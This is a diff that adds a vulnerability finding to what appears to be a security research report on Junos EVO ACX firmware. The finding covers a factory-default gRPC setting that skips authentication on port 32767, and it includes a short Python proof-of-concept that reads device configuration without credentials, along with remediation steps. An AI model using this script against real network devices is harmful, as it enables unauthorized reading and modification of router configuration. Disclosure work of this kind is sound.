@@ -1320,3 +1320,122 @@ e46c:  call memcpy(alloca_buf, inner_name, len+1)
   userland; authentication is handled upstream (SSH wrapping or Kerberos) before
   cli receives the JunoScript session. No pre-auth memory corruption path via
   credential attribute parsing.
+
+---
+
+## FINDING 5: Pre-auth gNMI/Telemetry Full Access — na-grpcd skip-authentication
+
+**Classification**: CRITICAL — pre-auth unauthenticated access to gNMI Get/Set/Subscribe
+**Binary**: `usr/sbin/na-grpcd` (7,650,344 bytes; PIE, no canary, no RELRO)
+**Platform**: ACX6160-T (factory default config); any Junos EVO ACX deployment using factory defaults
+
+### Trigger
+
+Factory config `/etc/config/acx6160-t-factory.conf` ships with:
+```
+services {
+    extension-service {
+        request-response {
+            grpc {
+                clear-text { port 32767; }
+                skip-authentication;
+            }
+        }
+    }
+}
+```
+
+`skip-authentication` removes ALL credential checking from the gRPC server on port 32767.
+No TLS (clear-text). Any network-reachable host can connect and call any registered service.
+
+### Exposed gRPC Services (port 32767, pre-auth)
+
+```
+/gnmi.gNMI/Capabilities   → device model/version fingerprint (read)
+/gnmi.gNMI/Get            → arbitrary YANG path read (full config + operational state)
+/gnmi.gNMI/Set            → arbitrary YANG path write (FULL CONFIG MODIFICATION)
+/gnmi.gNMI/Subscribe      → streaming operational state telemetry
+
+/telemetry.OpenConfigTelemetry/telemetrySubscribe          → streaming sensor data
+/telemetry.OpenConfigTelemetry/cancelTelemetrySubscription → session control
+/telemetry.OpenConfigTelemetry/getTelemetrySubscriptions   → subscription enumeration
+/telemetry.OpenConfigTelemetry/getTelemetryOperationalState
+/telemetry.OpenConfigTelemetry/getDataEncodings
+
+/authentication.Login/LoginCheck  → authentication service (also exposed pre-auth)
+```
+
+### Impact Chain
+
+```
+Attacker (network) → TCP 32767 (clear-text gRPC)
+                            |
+                   na-grpcd [skip-authentication]
+                            |
+                   /var/run/japi_mgd (Unix socket)
+                            |
+                       mgd daemon
+                            |
+              Junos YANG datastore (read/write)
+```
+
+na-grpcd acts as the authentication gateway for all gNMI requests. With
+`skip-authentication`, it forwards all gNMI Set operations to mgd over
+`/var/run/japi_mgd` without any credential validation. mgd implicitly
+trusts requests from na-grpcd (Unix socket = local process trust). This
+gives an unauthenticated remote attacker FULL read/write access to the
+device's YANG configuration datastore.
+
+### Memory Corruption Absence — Why na-grpcd Has No Pre-Auth RCE Primitive
+
+Binary analysis (all custom Junos code):
+- All path/string operations use C++ STL (`std::string`, `std::vector`) — memory-safe
+- 144 `strcpy` + 3 `strcat` + 8 `sprintf` imports: all in statically-linked protobuf
+  library code (0x3a0000-0x3c0000 range), never in Junos custom handlers
+- `fgets` import: present in PLT dynamic symbol table but has no `.rela.plt` entry;
+  not actually called at runtime
+- gRPC C++ 1.24.1 (statically linked): no known RCE CVEs in this version
+- OpenConfig Telemetry subscription path validation uses `std::string` (0x17fd70+)
+- gNMI SubscribeRequest path processing: C++ template STL throughout (0x182000+)
+
+**Conclusion**: No memory corruption primitive exists in the pre-auth gRPC request path.
+The pre-auth exposure is purely an authorization bypass — not a memory corruption RCE.
+The authorization bypass is itself critical (full config write without credentials).
+
+### Proof-of-Concept (Benign Verification)
+
+```python
+import grpc
+import gnmi_pb2, gnmi_pb2_grpc
+
+# No credentials — cleartext, no auth
+channel = grpc.insecure_channel('TARGET:32767')
+stub = gnmi_pb2_grpc.gNMIStub(channel)
+
+# Fingerprint via Capabilities (pre-auth)
+resp = stub.Capabilities(gnmi_pb2.CapabilityRequest())
+print(resp.gNMI_version, resp.supported_models)
+
+# Read full system config (pre-auth)
+path = gnmi_pb2.Path(elem=[gnmi_pb2.PathElem(name='system')])
+get_req = gnmi_pb2.GetRequest(path=[path], type=gnmi_pb2.GetRequest.CONFIG)
+resp = stub.Get(get_req)
+```
+
+### Relationship to Other Findings
+
+- Upgrades severity of FINDING 3 (mgd_reboot_command stack overflow) context:
+  mgd_reboot_command requires authenticated session + operator privilege.
+  skip-authentication does NOT route to mgd_reboot_command (that's NETCONF/CLI path).
+  No direct upgrade of FINDING 3 via this path.
+- FINDING 5 is independent: pre-auth config write is critical on its own.
+
+### Remediation
+
+1. Remove `skip-authentication` from factory default config — require authentication
+2. Bind gRPC to loopback (127.0.0.1) if only used for local management
+3. Apply firewall filter on port 32767 at network boundary
+4. Enable TLS (`ssl { port 32767; }`) even if authentication remains bypassed
+
+**CVE candidate**: Missing authentication for critical function (CWE-306).
+CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = **9.8 (Critical)**
